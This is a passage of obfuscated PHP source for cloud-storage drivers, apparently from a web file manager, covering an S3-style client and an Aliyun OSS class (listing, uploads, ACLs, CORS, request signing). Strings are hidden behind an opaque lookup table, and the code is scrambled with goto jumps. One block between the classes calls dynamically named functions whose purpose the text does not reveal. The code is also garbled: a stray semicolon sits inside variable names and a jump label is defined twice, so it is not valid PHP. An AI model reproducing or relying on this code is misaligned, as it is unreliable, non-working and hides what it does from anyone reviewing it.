&& $E¨[0][$bӛ[28]] != $eؐ) { return !0; } } } else { if (!empty($C؏)) { return !0; } } if ($bׯ󼠫 === null) { break; } } if ($DŔ) { $D = array_diff($D, array($eؐ)); $D = count(array_unique($D)); $e = count(array_unique($e)); return array($bӛ[199] => $D, $bӛ[200] => $e); } goto A㚍; A㚍: return !1; goto DѬֻ; e: $bׯ󼠫 = null; $c˛Т = 500; $c͇ = $bӛ[8]; goto Eڲ; DѬֻ: } public function listAll($C) { $Cˡ펞 =& $_SERVER[Ť]; $fȷ = $this->fileList($C, $Cˡ펞[33], !0); $F = array(); foreach ($fȷ[$Cˡ펞[73]] as $AƖ) { $F[$AƖ[$Cˡ펞[28]]] = $AƖ[$Cˡ펞[77]]; } foreach ($fȷ[$Cˡ펞[74]] as $AƖ) { if (is_string($AƖ)) { $F[$AƖ] = 0; } } return $this->listAllFiles($C, array_keys($F), $F); } public function canRead($e楖) { $c =& $_SERVER[Ť]; $bݵۿ = $this->client->getAccessControlPolicy($this->bucket, $e楖); if (!$bݵۿ) { return !1; } return in_array($bݵۿ, array($c[201], $c[202], $c[203])) ? !0 : !1; } public function canWrite($bޗݝ) { $bǲ =& $_SERVER[Ť]; $e𳇷 = $this->client->getAccessControlPolicy($this->bucket, $bޗݝ); if (!$e𳇷) { return !1; } return in_array($e𳇷, array($bǲ[201], $bǲ[202])) ? !0 : !1; } public function getContent($E) { return $this->client->getObject($this->bucket, $E); } public function setContent($e㎎, $E¿ = '', $f螙 = false) { goto F; F: $b󔽞 =& $_SERVER[Ť]; $e㎎ = $f螙 ? trim($e㎎, $b󔽞[8]) . $b󔽞[8] : $e㎎; $Eۑ = get_file_mime(get_path_ext($e㎎)); goto F҅֨; CΏ: $this->cacheMethod(null, null); $eäԮ = $this->copyFile($e㎎, $e㎎, array($b󔽞[204] => $eäԮ[$b󔽞[205]])); return $eäԮ ? !0 : !1; goto Bʺ; F҅֨: $eäԮ = $this->client->putObject($E¿, $this->bucket, $e㎎, $b󔽞[189], array(), $Eۑ); if (!$eäԮ) { return !1; } if ($f螙) { return !0; } goto CΏ; Bʺ: } public function fileSubstr($Aܲ􇪧, $B, $AƬ) { $A؛ = $B + $AƬ - 1; return $this->client->getObject($this->bucket, $Aܲ􇪧, array($_SERVER[Ť][206] => "\142\x79\164\145\163\75{$B}\55{$A؛}")); } public function upload($Aΐȃ, $dЎښ, $f = false, $D팈 = REPEAT_REPLACE) { $f =& $_SERVER[Ť]; $eԅ = array($f[204] => @md5_file($dЎښ)); $e = array($f[207] => get_file_mime(get_path_ext($Aΐȃ))); if (IO::size($dЎښ) <= 1024 * 1024 * 200) { $Aό = $this->client->putObjectFile($dЎښ, $this->bucket, $Aΐȃ, $f[189], $eԅ, $e); return !empty($Aό) ? $this->getPathOuter($Aΐȃ) : !1; } $F = $this->client->multiUploadObject($dЎښ, $this->bucket, trim($Aΐȃ, $f[8]), $eԅ, $e); return $F ? $this->getPathOuter($Aΐȃ) : !1; } public function download($Fǉƴ, $E䌠) { if (!@is_dir($this->pathFather($E䌠)) && !IO::mkdir($this->pathFather($E䌠))) { return !1; } $e䝘 = $this->client->getObject($this->bucket, $Fǉƴ, array(), $E䌠); return $e䝘 !== !1 ? $E䌠 : !1; } public function link($aա, $FÕ = array()) { $Aْ =& $_SERVER[Ť]; if ($this->signVer == $Aْ[208]) { return $this->client->getAuthenticatedURL($this->bucket, $aա, 3600 * 12, $FÕ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($aա, $Aْ[8]), 3600 * 12, $this->region, array(), !0, $FÕ); } public function fileOut($b߼, $A = false, $c˜ = false, $b宍½ = '') { goto c֭Н; d柚: $b = get_file_mime(get_path_ext($c˜)); if ($b == $e烷[209]) { return parent::fileOut($b߼, $A, $c˜, $b宍½); } $A = $A ? $e烷[210] : $e烷[211]; goto D; D: $Cԋ = array($e烷[212] => $A . $e烷[213] . rawurlencode($c˜), $e烷[214] => $b); $C = $this->link($b߼, $Cԋ); $this->fileOutLink($C); goto Bښ; c֭Н: $e烷 =& $_SERVER[Ť]; if ($this->isFileOutServer()) { return $this->fileOutServer($b߼, $A, $c˜, $b宍½); } if (!$c˜) { $c˜ = $this->pathThis($b߼); } goto d柚; Bښ: } public function fileOutServer($fԊ, $cԉ = false, $A땆 = false, $c砱Ȝ = '') { parent::fileOut($fԊ, $cԉ, $A땆, $c砱Ȝ); } public function fileOutImageServer($BŘ, $D = 250) { parent::fileOutImage($BŘ, $D); } public function hashMd5($f૏۹, $fɞ = '') { $B֝ =& $_SERVER[Ť]; $D҇ = $this->objectMeta($f૏۹); if (!$D҇) { return !1; } $fɞ = $fɞ ? $fɞ : _get($D҇, $B֝[215]); $fɞ = $fɞ ? $fɞ : _get($D҇, $B֝[205], $B֝[33]); return $fɞ; } public function uploadFormData($cƎ, $aԐ = 3600) { $d٩ =& $_SERVER[Ť]; $FՒ˩ە = $this->pathFather($cƎ); $Dؐ = $this->client->getHttpUploadPostParams($this->bucket, $FՒ˩ە, $d٩[189], $aԐ); return array_merge((array) $Dؐ, array($d٩[173] => $this->getHost())); } public function multiUploadFormData($f춭̏, $B = 3600) { $A؈˃ =& $_SERVER[Ť]; $f̊ = gmdate($A؈˃[216]); $e͵ۣ = array(); $d׼輂 = $this->client->getUploadId($this->bucket, $f춭̏, $e͵ۣ); if (!$d׼輂) { return !1; } return array($A؈˃[217] => $d׼輂, $A؈˃[173] => $this->getHost() . $A؈˃[8] . $this->pathEncode($f춭̏), $A؈˃[218] => $f̊, $A؈˃[89] => $f춭̏); } public function multiUploadAuthData($A΃, $D = array()) { goto F; E഑: $c = implode($aաϹ[225], $d려); $F = base64_encode(hash_hmac($aաϹ[226], $c, $this->secret, !0)); $B = $aաϹ[227] . $this->accessKey . $aաϹ[4] . $F; goto F; DǊ: $eڍ = $D[$aաϹ[89]]; unset($D[$aաϹ[89]]); if (isset($D[$aաϹ[219]])) { $D[$aաϹ[218]] = $D筏; return $this->listUploadParts($eڍ, $D); } goto dؠ⧜; F: $aաϹ =& $_SERVER[Ť]; $D筏 = isset($D[$aաϹ[218]]) ? $D[$aաϹ[218]] : gmdate($aաϹ[216]); $d = isset($D[$aաϹ[165]]) ? $D[$aաϹ[165]] : $aաϹ[33]; goto DǊ; F: if (strpos($d, $aաϹ[221]) === 0) { return array($aաϹ[228] => $B, $aաϹ[218] => $D筏); } return $B; goto c޹; dؠ⧜: $d려 = array($aաϹ[220], $aաϹ[33], $aաϹ[116], $aաϹ[33], "\x78\x2d\141\155\x7a\55\x64\x61\x74\145\72{$D筏}", $aաϹ[8] . $this->bucket . $aաϹ[8] . $this->pathEncode($eڍ) . $d); if (strpos($d, $aաϹ[221]) === 0) { $d려[0] = $aաϹ[222]; } if (isset($D[$aաϹ[223]]) && $D[$aաϹ[223]] == $aաϹ[224]) { $d려[0] = $aաϹ[224]; } goto E഑; c޹: } public function listUploadParts($eĥ, $c隽 = array()) { goto Aќ; B: $aӸޏ = $this->multiUploadAuthData($eĥ, $c隽); if (empty($aӸޏ)) { return !1; } return array($aύ[228] => $aӸޏ, $aύ[218] => $c隽[$aύ[218]], $aύ[230] => $D֔); goto A; AЊ: if (!$D֔) { return !1; } unset($c隽[$aύ[219]], $c隽[$aύ[223]]); $c隽[$aύ[89]] = $eĥ; goto B; Aќ: $aύ =& $_SERVER[Ť]; $cߔ = str_replace($aύ[229], $aύ[33], $c隽[$aύ[165]]); $D֔ = $this->client->listParts($this->bucket, $eĥ, $cߔ); goto AЊ; A: } public function getHost() { return parent::getHost() . $_SERVER[Ť][8] . $this->bucket; } public function size($Dχ) { $bƃ = $this->objectMeta($Dχ); return $bƃ ? $bƃ[$_SERVER[Ť][77]] : 0; } public function info($e핅) { if ($this->isFolder($e핅)) { return $this->folderInfo($e핅); } else { if ($this->isFile($e핅)) { return $this->fileInfo($e핅); } } return !1; } public function exist($dˇ) { return $this->isFile($dˇ) || $this->isFolder($dˇ); } public function isFile($Eڬ) { return !$this->isFolder($Eڬ) && $this->objectMeta($Eڬ); } public function isFolder($C޾) { return $this->cacheMethod($_SERVER[Ť][195], $C޾); } protected function objectMeta($Dǵ) { return $this->cacheMethod($_SERVER[Ť][196], $Dǵ); } protected function _objectMeta($d) { $cՄ =& $_SERVER[Ť]; $d = rtrim($d, $cՄ[8]); try { $Cأ = $this->client->getObjectInfo($this->bucket, $d); if (!isset($Cأ[$cՄ[215]]) && isset($Cأ[$cՄ[231]])) { $Cأ[$cՄ[215]] = $Cأ[$cՄ[231]]; } } catch (Exception $c⬪Ѻ) { $Cأ = !1; } if (!$Cأ) { } return $Cأ; } protected function _isFolder($fԣ) { goto C򉈖; c艌: $Eҕ = $this->client->getBucket($this->bucket, $fԣ, null, 1); if (empty($Eҕ[$a[194]])) { return !1; } $dư˅ = $Eҕ[$a[194]][0][$a[28]]; goto Bގ; C򉈖: $a =& $_SERVER[Ť]; $fԣ = rtrim($fԣ, $a[8]); if ($fԣ == $a[33] || $fԣ == $a[8]) { return !0; } goto c艌; Bގ: if (substr($dư˅, -1) == $a[8]) { return !0; } if (get_path_this($dư˅) == get_path_this($fԣ)) { return !1; } return !0; goto fﮭ; fﮭ: } } define($_SERVER[Ť][232], 1); goto eΔʟ; Dӟ: if ($_SERVER[$_SERVER[Ť][719]] != $_SERVER[$_SERVER[Ť][1225]]) { goto eѲ; E؇: $E = explode($_SERVER[Ť][225], $dɦ); if (count($E) < $_SERVER[Ť][564]) { $D = $_SERVER[Ť][724]; $D(); } $b = $_SERVER[Ť][725]; goto C鸛; C鸛: $b($_SERVER[$_SERVER[Ť][720]]); goto A; eѲ: $f = $_SERVER[Ť][721]; $fᖖ = $_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]; $dɦ = $f($fᖖ); goto E؇; A: } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Bޝۂ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ť][1226]; $this->_init($Bޝۂ); } public function _init($c) { $B콉į =& $_SERVER[Ť]; foreach ($c as $bݽ => $c鈔) { if (isset($this->{$bݽ})) { $this->{$bݽ} = $c鈔; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($B콉į[1227] . LNG($B콉į[1228])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto d; B˯: $c䒴->setMaxAgeSeconds(600); $c䒴->addExposeHeader($aЇ[1234]); $c䒴->addAllowedHeader($aЇ[1229]); goto C; d: $aЇ =& $_SERVER[Ť]; $d = new OSS\Model\CorsConfig(); $c䒴 = new OSS\Model\CorsRule(); goto B; C: $d->addRule($c䒴); try { $this->client->putBucketCors($this->bucket, $d); } catch (OSS\Core\OssException $dǯʏ) { return !1; } return !0; goto aЪ; B: $c䒴->addAllowedOrigin($aЇ[1229]); $c䒴->addAllowedMethod($aЇ[1230]); $c䒴->addAllowedMethod($aЇ[1231]); goto Fܡ; Fܡ: $c䒴->addAllowedMethod($aЇ[1232]); $c䒴->addAllowedMethod($aЇ[1233]); $c䒴->addAllowedMethod($aЇ[155]); goto B˯; aЪ: } public function getBucketCors() { goto fŰÉ; dּ: $f = $c몴[0]->getMaxAgeSeconds(); $b犓 = $c몴[0]->getExposeHeaders(); $b䬑 = $c몴[0]->getAllowedHeaders(); goto dӂ; dӂ: return array($C͔ް[179] => isset($A਽ۋ[0]) ? $A਽ۋ[0] : $C͔ް[33], $C͔ް[183] => $bІ, $C͔ް[1235] => $f, $C͔ް[1236] => isset($b犓[0]) ? $b犓[0] : $C͔ް[33], $C͔ް[181] => isset($b䬑[0]) ? $b䬑[0] : $C͔ް[33]); goto f▽; aн: if (!$bŴ || !($c몴 = $bŴ->getRules())) { return null; } $A਽ۋ = $c몴[0]->getAllowedOrigins(); $bІ = $c몴[0]->getAllowedMethods(); goto dּ; fŰÉ: $C͔ް =& $_SERVER[Ť]; $bŴ = null; try { $bŴ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $bм) { return null; } goto aн; f▽: } public function isBucketCors() { goto B񌣞; B񌣞: $Aآ =& $_SERVER[Ť]; $aΑ = $this->getBucketCors(); if (!$aΑ || !is_array($aΑ)) { return !1; } goto D펞; fփح: $Dԯ = array($Aآ[184], $Aآ[185], $Aآ[186], $Aآ[187], $Aآ[188]); $C = array_diff($Dԯ, $dĔ); return empty($C); goto d΋; D펞: if ($aΑ[$Aآ[179]] != $Aآ[180] || $aΑ[$Aآ[181]] != $Aآ[180]) { return !1; } $dĔ = array_map($Aآ[182], $aΑ[$Aآ[183]]); if (!is_array($dĔ)) { $dĔ = array(); } goto fփح; d΋: } public function mkfile($E, $FȆ桱 = '', $cɾ = REPEAT_RENAME) { $Aݲ = $this->setContent($E, $FȆ桱); if ($Aݲ !== !1) { return $this->getPathOuter($E); } return !1; } public function mkdir($DŲ, $Dƽ = REPEAT_SKIP) { if ($this->_isFolder($DŲ)) { return $this->getPathOuter($DŲ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($DŲ)); } catch (OSS\Core\OssException $Cഉ) { return !1; } return $this->getPathOuter($DŲ); } private function fileList($C氇, $Eۑԟ = '', $F׳ = 0) { goto dۉ݈; dۉ݈: $B =& $_SERVER[Ť]; $C氇 = trim($C氇, $B[8]); $cՙ = empty($C氇) ? $B[33] : $C氇 . $B[8]; goto aŘ; A: return array($B[74] => $E, $B[73] => $D;); goto eƬ; aŘ: $fڙ = $B[33]; $Cɰ = 1000; $d펺ʎ = $this->listItemCache === !1 ? !1 : !0; goto e; e: $E = $D; = array(); while (!0) { check_abort(); $eϨ = array($B[1237] => $Eۑԟ, $B[1238] => $cՙ, $B[1239] => $Cɰ, $B[1240] => $fڙ); try { $F刉 = $this->client->listObjects($this->bucket, $eϨ); } catch (OSS\Core\OssException $CȨ) { break; } $fڙ = $F刉->getNextMarker(); $dː = $F刉->getObjectList(); $F = $F刉->getPrefixList(); foreach ($dː as $d) { goto Aŏ; F: $aɤĪ = $d->getLastModified(); $A = $F׳ ? array($B[28] => $Aʞ, $B[77] => $e, $B[193] => strtotime($aɤĪ)) : $Aʞ; $A = $e == 0 && substr($Aʞ, strlen($Aʞ) - 1, 1) == $B[8] ? !0 : !1; goto FҦ; FҦ: if ($d펺ʎ) { $this->cacheMethod($B[195], $Aʞ, $A); $this->cacheMethod($B[196], $Aʞ, array($B[77] => $e, $B[1241] => $e, $B[107] => strtotime($aɤĪ), $B[1242] => $aɤĪ)); } if ($A) { $E[] = $Aʞ; continue; } $D;[] = $A; goto d; Aŏ: if ($d->getKey() == $cՙ) { continue; } $Aʞ = $d->getKey(); $e = $d->getSize(); goto F; d: } foreach ($F as $b) { $E[] = $b->getPrefix(); if ($d펺ʎ) { $this->cacheMethod($B[195], $Aʞ, !0); } } if ($fڙ === $B[33]) { break; } } if ($d펺ʎ) { $this->cacheMethod($B[195], $C氇, !0); } goto A; eƬ: } public function copyFile($a剐, $e) { $A = $this->size($a剐); if ($A < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $a剐, $this->bucket, $this->pathEncode($e)); } catch (OSS\Core\OssException $eҐĪ) { return !1; } return $this->getPathOuter($e); } $EǶ՞ = $this->multiCopyObject($a剐, $e, $A); return $EǶ՞ ? $this->getPathOuter($e) : !1; } private function multiCopyObject($Fﶴ, $f, $a˓) { $Cא =& $_SERVER[Ť]; try { goto a貖; D޾: $c֙ = 1024 * 1024 * 10; $bǈ = $this->client->generateMultiuploadParts($a˓, $c֙); foreach ($bǈ as $E܈ => $BݗËԪ) { $aԽ = $Cν + (int) $BݗËԪ[$Cא[1244]]; $bކ = (int) $BݗËԪ[$Cא[331]] + $aԽ - 1; $a· = array($Cא[1245] => $aԽ, $Cא[1246] => $bކ); $b[] = $this->client->uploadPartCopy($this->bucket, $Fﶴ, $this->bucket, $this->pathEncode($f), $eΦ, $D됈, $a·); $eΦ = $eΦ + 1; } goto cǩ՘; a貖: $dɇȚ = array(); if ($eȢ = $this->hashMd5($Fﶴ)) { $dɇȚ = array(OSS\OssClient::OSS_HEADERS => array($Cא[1243] => $eȢ)); } $D됈 = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f), $dɇȚ); goto B廇; cǩ՘: $Bݚ = array(); foreach ($b as $E܈ => $Bݐٿ) { $Bݚ[] = array($Cא[1247] => $E܈ + 1, $Cא[1248] => $Bݐٿ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($f), $D됈, $Bݚ); goto E푦; B廇: $eΦ = 1; $Cν = 0; $b = array(); goto D޾; E푦: } catch (OSS\Core\OssException $EߎƐ) { return !1; } return !0; } public function moveFile($d, $A) { if ($this->copyFile($d, $A)) { $this->remove($d); return $this->getPathOuter($A); } return !1; } public function delFile($Bя) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Bя)); } catch (OSS\Core\OssException $Fݎ⥻) { return !1; } return !0; } public function delFolder($fÔ̵) { goto eю; bׅ: return $this->delByBatch($Cۏ[$bݑ[74]]); goto C̙; eю: $bݑ =& $_SERVER[Ť]; if (!$this->exist($fÔ̵)) { return !0; } $this->listItemCache = !1; goto bɳ; bɳ: $Cۏ = $this->fileList($fÔ̵); $this->listItemCache = !0; $Fǳ = trim($fÔ̵, $bݑ[8]) . $bݑ[8]; goto eਥ; eਥ: if (!empty($fÔ̵) && !in_array($Fǳ, $Cۏ[$bݑ[74]])) { $Cۏ[$bݑ[74]][] = $Fǳ; } $eʆ = $this->delByBatch($Cۏ[$bݑ[73]]); if (!$eʆ) { return !1; } goto bׅ; C̙: } private function delByBatch($FӾˢ) { foreach (array_chunk($FӾˢ, 1000) as $b㨋拋) { try { $this->client->deleteObjects($this->bucket, $b㨋拋); } catch (OSS\Core\OssException $eȎ) { return !1; } } return !0; } public function rename($BՏ, $cҸ) { return $this->renameObject($BՏ, $cҸ); } private function fileInfo($c쟎, $Fҧ = false, $f = array()) { goto B; D: return $Ȇڻ; goto dϼ; b݉: if (isset($f[$d[77]])) { $Ȇڻ[$d[77]] = $f[$d[77]]; } if (isset($f[$d[107]])) { $Ȇڻ[$d[107]] = $f[$d[107]]; } if (isset($f[$d[193]]) && !trim($Ȇڻ[$d[107]])) { $Ȇڻ[$d[107]] = $f[$d[193]]; } goto D; B: $d =& $_SERVER[Ť]; $Ȇڻ = array($d[28] => $this->pathThis($c쟎), $d[75] => $this->getPathOuter($c쟎), $d[29] => $d[171], $d[77] => isset($f[$d[77]]) ? $f[$d[77]] : 0, $d[165] => $this->ext($c쟎)); if ($Fҧ) { return $Ȇڻ; } goto Fؖ; Fؖ: $Ȇڻ[$d[190]] = $Ȇڻ[$d[107]] = 0; $Ȇڻ[$d[191]] = $Ȇڻ[$d[192]] = !0; if (empty($f)) { $fռ = $this->objectMeta($c쟎); if (!$fռ) { return $Ȇڻ; } $f = array($d[107] => strtotime($fռ[$d[1242]]), $d[77] => $fռ[$d[1241]] + 0); } goto b݉; dϼ: } private function folderInfo($Fݖ, $Eݕۿ = false, $Dܜ = array()) { goto F񈊅; A: $aμ[$b[190]] = $aμ[$b[107]] = 0; $aμ[$b[191]] = $aμ[$b[192]] = !0; if (empty($Dܜ)) { $Fݖ = rtrim($Fݖ, $b[8]) . $b[8]; $dԊ = $this->objectMeta($Fݖ); if (!$dԊ) { return $aμ; } $Dܜ = array($b[190] => $dԊ[$b[1249]][$b[1250]], $b[107] => strtotime($dԊ[$b[1242]])); } goto DԔ; F񈊅: $b =& $_SERVER[Ť]; $aμ = array($b[28] => $this->pathThis($Fݖ), $b[75] => $this->getPathOuter($b[8] . $Fݖ), $b[29] => $b[76]); if ($Eݕۿ) { return $aμ; } goto A; DԔ: if (isset($Dܜ[$b[107]])) { $aμ[$b[107]] = $Dܜ[$b[107]]; } if (isset($Dܜ[$b[190]])) { $aμ[$b[190]] = $Dܜ[$b[190]]; } return $aμ; goto C۪; C۪: } public function listPath($Eأ, $Aǣݽ = false) { $eΊ =& $_SERVER[Ť]; $f = $this->fileList($Eأ, $eΊ[8], !0); foreach ($f[$eΊ[74]] as $d => $c趛) { $f[$eΊ[74]][$d] = $this->folderInfo($c趛, $Aǣݽ, $c趛); } foreach ($f[$eΊ[73]] as $d => $c趛) { $f[$eΊ[73]][$d] = $this->fileInfo($c趛[$eΊ[28]], $Aǣݽ, $c趛); } return $f; } public function has($cŤ, $B㱓 = false, $B = true) { goto d; DҎһ: $Eޘ = $b[33]; $d = 500; $a = $e੍ = 0; goto A; d: $b =& $_SERVER[Ť]; $cŤ = trim($cŤ, $b[8]); $E = empty($cŤ) ? $b[33] : $cŤ . $b[8]; goto DҎһ; A: while (!0) { check_abort(); $cӜٛ = array($b[1237] => $b[8], $b[1238] => $E, $b[1239] => $d, $b[1240] => $Eޘ); try { $D櫭 = $this->client->listObjects($this->bucket, $cӜٛ); } catch (OSS\Core\OssException $Bȍˡ) { break; } $Eޘ = $D櫭->getNextMarker(); $e = $D櫭->getObjectList(); $D׵ = $D櫭->getPrefixList(); if ($B㱓) { if (count($e) > 1 || count($e) == 1 && $e[0]->getKey() != $E) { $a += count($e) - 1; } if (!empty($D׵)) { $e੍ += count($D׵); } if ($Eޘ === $b[33]) { break; } continue; } if ($B) { if (!empty($e)) { if (count($e) > 1 || $e[0]->getKey() != $E) { return !0; } } } else { if (!empty($D׵)) { return !0; } } if ($Eޘ === $b[33]) { break; } } if ($B㱓) { return array($b[199] => $a, $b[200] => $e੍); } return !1; goto b; b: } public function listAll($b) { $eÅ =& $_SERVER[Ť]; $F馯 = $this->fileList($b, $eÅ[33], !0); $Eĳ = array(); foreach ($F馯[$eÅ[73]] as $BП) { $Eĳ[$BП[$eÅ[28]]] = $BП[$eÅ[77]]; } foreach ($F馯[$eÅ[74]] as $BП) { if (is_string($BП)) { $Eĳ[$BП] = 0; } } return $this->listAllFiles($b, array_keys($Eĳ), $Eĳ); } public function canRead($e֍) { $D󨐙 =& $_SERVER[Ť]; $bΚʃ = $this->pathAcl($e֍); return $bΚʃ == $D󨐙[1251] || $bΚʃ == $D󨐙[508] ? !0 : !1; } public function canWrite($E) { $e㼉 = $this->pathAcl($E); return $e㼉 == $_SERVER[Ť][508] ? !0 : !1; } public function pathAcl($C·) { goto aӕ; e: $d項 = $dؖң == $Dţܑ[34] ? $this->bucketAcl : $dؖң; if ($d項 == $Dţܑ[1252]) { return $Dţܑ[1251]; } if ($d項 == $Dţܑ[1253]) { return $Dţܑ[508]; } goto EϷ; EϷ: return $d項; goto cۯڕ; aӕ: $Dţܑ =& $_SERVER[Ť]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $dؖң = $this->client->getObjectAcl($this->bucket, $this->pathEncode($C·)); } catch (OSS\Core\OssException $f嫹) { return !1; } goto e; cۯڕ: } private function chmodPath($aᏡ, $A = '') { $a =& $_SERVER[Ť]; $b = empty($A) ? $a[1253] : $A; $c = array($a[34], $a[189], $a[1252], $a[1253]); if (!in_array($b, $c)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($aᏡ), $b); } catch (OSS\Core\OssException $Aւ) { return !1; } return !0; } public function getContent($f) { return $this->fileSubstr($f, -1); } public function setContent($bБ, $c΄ѻ = '') { $Dڤ㑟 =& $_SERVER[Ť]; try { $f = $this->trafficLimit($Dڤ㑟[1254]); $Aî됈 = $this->client->putObject($this->bucket, $this->pathEncode($bБ), $c΄ѻ, $f); } catch (OSS\Core\OssException $eх) { return !1; } $cц = array($Dڤ㑟[1243] => trim($Aî됈[$Dڤ㑟[1255]], $Dڤ㑟[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bБ))); $this->updateObjMeta($bБ, $cц); return isset($Aî됈[$Dڤ㑟[1256]][$Dڤ㑟[1201]]) ? !0 : !1; } private function updateObjMeta($Bå, $F) { $Bå = $this->pathEncode($Bå); try { $d͑ג = array(OSS\OssClient::OSS_HEADERS => $F); $this->client->copyObject($this->bucket, $Bå, $this->bucket, $Bå, $d͑ג); } catch (OSS\Core\OssException $aì) { return !1; } return !0; } public function upload($B竨, $d, $eɥ = false, $bՏ = REPEAT_REPLACE) { $f =& $_SERVER[Ť]; $eԪ = trim($B竨, $f[8]); $e = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($f[1243] => @md5_file($d)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($B竨))); $e = $this->trafficLimit($f[1254], $e); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eԪ), $d, $e); } catch (OSS\Core\OssException $cÝݴ) { return !1; } return $this->getPathOuter($B竨); } public function getHost() { $a榏 =& $_SERVER[Ť]; $Aîڂ = explode($a榏[175], parent::getHost()); return $Aîڂ[0] . $a榏[175] . $this->bucket . $a榏[91] . $Aîڂ[1]; } public function uploadFormData($e, $bۆ = 3600) { goto F߉; e˂κ: $D = date($B¹[1257], time() + $A捊); $eű = new DateTime($D); $Bԭ = $eű->format(DateTime::ISO8601); goto eƿ糰; F눺: return $b; goto aЋ; eƿ糰: $Cϒ␮ = strpos($Bԭ, $B¹[290]); $Bԭ = substr($Bԭ, 0, $Cϒ␮) . $B¹[1258]; $Aݥ = 1048576000 * 5; goto b律; F߉: $B¹ =& $_SERVER[Ť]; if (!($B̎ = $this->getHost())) { return !1; } $A捊 = $bۆ; goto e˂κ; FȺ: $cцɲ = base64_encode(hash_hmac($B¹[226], $c, $this->secret, !0)); $b = array($B¹[1167] => $c, $B¹[1260] => $this->accessKey, $B¹[1163] => $B¹[1155], $B¹[1261] => $cцɲ, $B¹[173] => $B̎); $b = $this->trafficLimit($B¹[1254], $b); goto F눺; b律: $fڸ = $this->pathFather($e); $bޛ = array($B¹[1157] => $Bԭ, $B¹[1158] => array(array($B¹[1259], 0, $Aݥ), array($B¹[1161], $B¹[1162], $fڸ))); $c = base64_encode(json_encode($bޛ)); goto FȺ; aЋ: } public function multiUploadFormData($bϕ, $E܌޻ = 3600) { $F =& $_SERVER[Ť]; if (!($B = $this->getHost())) { return !1; } $b綉 = $this->trafficLimit($F[1254]); $F冞 = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bϕ), $b綉); return array($F[217] => $F冞, $F[173] => $B . $F[8] . $this->pathEncode($bϕ), $F[218] => gmdate($F[1262]), $F[89] => $bϕ); } public function multiUploadAuthData($dƐ, $b = array()) { goto Fؚ; Fؚ: $A͐ =& $_SERVER[Ť]; $B = isset($b[$A͐[218]]) ? $b[$A͐[218]] : gmdate($A͐[1262]); $fȷ = isset($b[$A͐[165]]) ? $b[$A͐[165]] : $A͐[33]; goto A; A: $EҤ = $dƐ; if (isset($b[$A͐[89]])) { $EҤ = $b[$A͐[89]]; unset($b[$A͐[89]]); } if (isset($b[$A͐[219]])) { $b[$A͐[218]] = $B; return $this->listUploadParts($EҤ, $b); } goto fô; E: if (!empty($b[$A͐[1264]])) { $DΎ = array_merge(array($BȚҾ[4]), $b[$A͐[1264]]); sort($DΎ); $BȚҾ[4] = implode($A͐[225], $DΎ); } $F׺ = implode($A͐[225], $BȚҾ); $Eء = base64_encode(hash_hmac($A͐[226], $F׺, $this->secret, !0)); goto C; fô: $BȚҾ = array($A͐[220], $A͐[33], $A͐[116], $B, "\x78\55\x6f\x73\163\55\x64\141\x74\x65\72{$B}", $A͐[8] . $this->bucket . $A͐[8] . $EҤ . $fȷ); if (strpos($fȷ, $A͐[221]) === 0) { $BȚҾ[0] = $A͐[222]; if ($BìϦ = $this->trafficLimit($A͐[1254])) { $EҤ = $A͐[1263]; array_splice($BȚҾ, 5, 0, $EҤ . $A͐[4] . $BìϦ[$EҤ]); } } if (isset($b[$A͐[223]]) && $b[$A͐[223]] == $A͐[224]) { $BȚҾ[0] = $A͐[224]; } goto E; C: $cڰ = $A͐[1227] . $this->accessKey . $A͐[4] . $Eء; if (strpos($fȷ, $A͐[221]) === 0) { $cڰ = array($A͐[228] => $cڰ, $A͐[218] => $B); if ($BìϦ) { $cڰ = array_merge($cڰ, $BìϦ); } } return $cڰ; goto A挙; A挙: } public function listUploadParts($d, $E) { goto B; F: unset($E[$cՔ[219]], $E[$cՔ[223]]); $c̱ϋ = $this->multiUploadAuthData($d, $E); if (empty($c̱ϋ)) { return !1; } goto c՞; B: $cՔ =& $_SERVER[Ť]; $BĎֿ = parse_url_query($E[$cՔ[165]]); $d蔅 = $this->client->listParts($this->bucket, $this->pathEncode($d), $BĎֿ[$cՔ[217]]); goto c; c: $e = $d蔅->getListPart(); $e = array(); foreach ($e as $B؊) { $e[] = array($cՔ[1247] => $B؊->getPartNumber(), $cՔ[1248] => trim($B؊->getETag(), $cՔ[113])); } goto F; c՞: return array($cՔ[228] => $c̱ϋ, $cՔ[218] => $E[$cՔ[218]], $cՔ[230] => $e); goto eٝŦ; eٝŦ: } public function download($D␕˺, $f) { if ($this->isFolder($D␕˺)) { return !1; } try { $EЩȭ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f); $EЩȭ = $this->trafficLimit($_SERVER[Ť][105], $EЩȭ); $this->client->getObject($this->bucket, $this->pathEncode($D␕˺), $EЩȭ); } catch (OSS\Core\OssException $b) { return !1; } return $f; } public function fileSubstr($CÙ, $fƂ = 0, $Aܑ֭ = false) { if ($fƂ === -1) { $D = array(); } else { if ($Aܑ֭ === !1) { $B = $this->size($CÙ); } else { $B = $fƂ + $Aܑ֭ - 1; } $D = 